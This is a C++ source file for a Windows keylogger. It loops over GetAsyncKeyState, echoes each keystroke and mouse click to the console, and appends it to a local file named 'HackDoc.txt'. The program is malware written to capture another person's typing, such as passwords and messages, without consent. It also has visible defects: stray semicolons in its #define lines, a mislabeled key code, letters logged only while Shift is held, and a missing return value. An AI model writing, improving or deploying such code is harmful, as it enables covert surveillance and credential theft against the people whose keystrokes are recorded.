#include <iostream>
#include <Windows.h>
#include <fstream>
#include <string>
#include <time.h>


#define VK_MULTIPLY 0x6A;
#define VK_SPACE 0x20;
#define VK_ADD 0x6B;
#define VK_F1 0x70;
#define VK_TAB 0x09;
#define VK_LWIN 0x5B;
#define VK_RETURN 0x0D;
#define VK_BACK 0x08;


void WriteToFile(LPCSTR text)
{
	std::ofstream doc_to;
	doc_to.open("HackDoc.txt", std::fstream::app);
	doc_to << text;
	doc_to.close();
}

bool Key_is_Listed(WORD iKey)
{
	switch (iKey)
	{
	case 0x6A:
		std::cout << "*";
		WriteToFile("*");
		break;

	case 0x5B:
		std::cout << "Left_Win";
		WriteToFile("Left_Win");
		break;


	case 0x20:
		std::cout << " ";
		WriteToFile(" ");
		break;

	case 0x6B:
		std::cout << "+";
		WriteToFile("+");
		break;

	case 0x70:
		std::cout << " *F1* ";
		WriteToFile(" *F1* ");
		break;

	case 0x09:
		std::cout << " *TAB* ";
		WriteToFile(" *TAB* ");
		break;

	case 48:
		std::cout << "0";
		WriteToFile("0");
		break;

	case 49:
		std::cout << "1";
		WriteToFile("1");

		break;

	case 50:
		std::cout << "2";
		WriteToFile("2");
		break;

	case 51:
		std::cout << "3";
		WriteToFile("3");
		break;

	case 52:
		std::cout << "4";
		WriteToFile("4");
		break;

	case 53:
		std::cout << "5";
		WriteToFile("5");
		break;

	case 54:
		std::cout << "6";
		WriteToFile("6");
		break;

	case 55:
		std::cout << "7";
		WriteToFile("7");
		break;

	case 56:
		std::cout << "8";
		WriteToFile("8");
		break;

	case 57:
		std::cout << "9";
		WriteToFile("9");
		break;

	case 58:
		if (GetAsyncKeyState(VK_LSHIFT))
		{

		}
		break;

	case 59:
		if (GetAsyncKeyState(VK_LSHIFT))
		{

		}
		break;

	case 60:
		if (GetAsyncKeyState(VK_LSHIFT))
		{

		}
		break;

	case 61:
		if (GetAsyncKeyState(VK_LSHIFT))
		{

		}
		break;

	case 62:
		if (GetAsyncKeyState(VK_LSHIFT))
		{

		}
		break;

	case 63:
		if (GetAsyncKeyState(VK_LSHIFT))
		{

		}
		break;

	case 64:
		if (GetAsyncKeyState(VK_LSHIFT))
		{
			std::cout << "A";
			WriteToFile("A");
		}
		break;

	case 65:
		if (GetAsyncKeyState(VK_LSHIFT))
		{
			std::cout << "A";
			WriteToFile("A");
		}
		break;

	case 66:
		if (GetAsyncKeyState(VK_LSHIFT))
		{
			std::cout << "B";
			WriteToFile("B");
		}
		break;

	case 67:
		if (GetAsyncKeyState(VK_LSHIFT))
		{
			std::cout << "C";
			WriteToFile("C");
		}
		break;

	case 68:
		if (GetAsyncKeyState(VK_LSHIFT))
		{
			std::cout << "D";
			WriteToFile("D");
		}
		break;

	case 69:
		if (GetAsyncKeyState(VK_LSHIFT))
		{
			std::cout << "E";
			WriteToFile("E");
		}
		break;

	case 70:
		if (GetAsyncKeyState(VK_LSHIFT))
		{
			std::cout << "F";
			WriteToFile("F");
		}
		break;

	case 71:
		if (GetAsyncKeyState(VK_LSHIFT))
		{
			std::cout << "G";
			WriteToFile("G");
		}
		break;

	case 72:
		if (GetAsyncKeyState(VK_LSHIFT))
		{
			std::cout << "H";
			WriteToFile("H");
		}
		break;

	case 73:
		if (GetAsyncKeyState(VK_LSHIFT))
		{
			std::cout << "I";
			WriteToFile("I");
		}
		break;

	case 74:
		if (GetAsyncKeyState(VK_LSHIFT))
		{
			std::cout << "J";
			WriteToFile("J");
		}
		break;


	case 75:
		if (GetAsyncKeyState(VK_LSHIFT))
		{
			std::cout << "K";
			WriteToFile("K");
		}
		break;


	case 76:
		if (GetAsyncKeyState(VK_LSHIFT))
		{
			std::cout << "L";
			WriteToFile("L");
		}
		break;

	case 77:
		if (GetAsyncKeyState(VK_LSHIFT))
		{
			std::cout << "M";
			WriteToFile("M");
		}
		break;


	case 78:
		if (GetAsyncKeyState(VK_LSHIFT))
		{
			std::cout << "N";
			WriteToFile("N");
		}
		break;

	case 79:
		if (GetAsyncKeyState(VK_LSHIFT))
		{
			std::cout << "O";
			WriteToFile("O");
		}
		break;

	case 80:
		if (GetAsyncKeyState(VK_LSHIFT))
		{
			std::cout << "P";
			WriteToFile("P");
		}
		break;

	case 81:
		if (GetAsyncKeyState(VK_LSHIFT))
		{
			std::cout << "Q";
			WriteToFile("Q");
		}
		break;

	case 82:
		if (GetAsyncKeyState(VK_LSHIFT))
		{
			std::cout << "R";
			WriteToFile("R");
		}
		break;

	case 83:
		if (GetAsyncKeyState(VK_LSHIFT))
		{
			std::cout << "S";
			WriteToFile("S");
		}
		break;

	case 84:
		if (GetAsyncKeyState(VK_LSHIFT))
		{
			std::cout << "T";
			WriteToFile("T");
		}
		break;

	case 85:
		if (GetAsyncKeyState(VK_LSHIFT))
		{
			std::cout << "U";
			WriteToFile("U");
		}
		break;

	case 86:
		if (GetAsyncKeyState(VK_LSHIFT))
		{
			std::cout << "V";
			WriteToFile("V");
		}
		break;

	case 87:
		if (GetAsyncKeyState(VK_LSHIFT))
		{
			std::cout << "W";
			WriteToFile("W");
		}
		break;

	case 88:
		if (GetAsyncKeyState(VK_LSHIFT))
		{
			std::cout << "X";
			WriteToFile("X");
		}
		break;

	case 89:
		if (GetAsyncKeyState(VK_LSHIFT))
		{
			std::cout << "Y";
			WriteToFile("Y");
		}
		break;

	case 90:
		if (GetAsyncKeyState(VK_LSHIFT))
		{
			std::cout << "Z";
			WriteToFile("Z");
		}
		break;



	case 0x0D:
		std::cout << "\n";
		WriteToFile("\n");
		break;

	case VK_LSHIFT:
		std::cout << " *Left_Shift* ";
		WriteToFile(" *Left_Shift* ");
		break;

	case VK_RSHIFT:
		std::cout << " *Right_Shift* ";
		WriteToFile(" *Right_Shift* ");
		break;

	case 0x08:
		std::cout << "\b";
		WriteToFile("\b");
		break;


	case VK_ESCAPE:
		std::cout << " *Esc* ";
		WriteToFile(" *Esc* ");
		break;

	case VK_UP:
		std::cout << " btn_up ";
		WriteToFile(" btn_up ");
		break;

	case VK_DOWN:
		std::cout << " btn_down ";
		WriteToFile(" btn_down ");
		break;

	case VK_LEFT:
		std::cout << " btn_left ";
		WriteToFile(" btn_left ");
		break;

	case VK_RIGHT:
		std::cout << " btn_right ";
		WriteToFile(" btn_right ");
		break;

	case VK_CONTROL:
		std::cout << " btn_ctrl ";
		WriteToFile(" btn_ctrl ");
		break;

	case VK_INSERT:
		std::cout << " Insert ";
		WriteToFile(" Insert ");
		break;

	case VK_DELETE:
		std::cout << " Delete ";
		WriteToFile(" Delete ");
		break;


	case VK_RBUTTON:
		std::cout << "*mouse_right*";
		WriteToFile("*mouse_right*");
		break;

	case VK_LBUTTON:
		std::cout << "*mouse_left*";
		WriteToFile("*mouse_left*");
		break;

	default: return false;
	}
}


int main()
{
	setlocale(LC_ALL, "ru");

	char key;

	while (true)
	{
		Sleep(10);
		for (key = 8; key <= 250; key++)
		{
			if (GetAsyncKeyState(key) == -32767)
			{
				if (Key_is_Listed(key) == false)
				{
					std::ofstream doc_to;
					doc_to.open("HackDoc.txt", std::fstream::app);
					doc_to << key;
					doc_to.close();
				}
			}
		}
	}
	system("pause");
	return 0;
}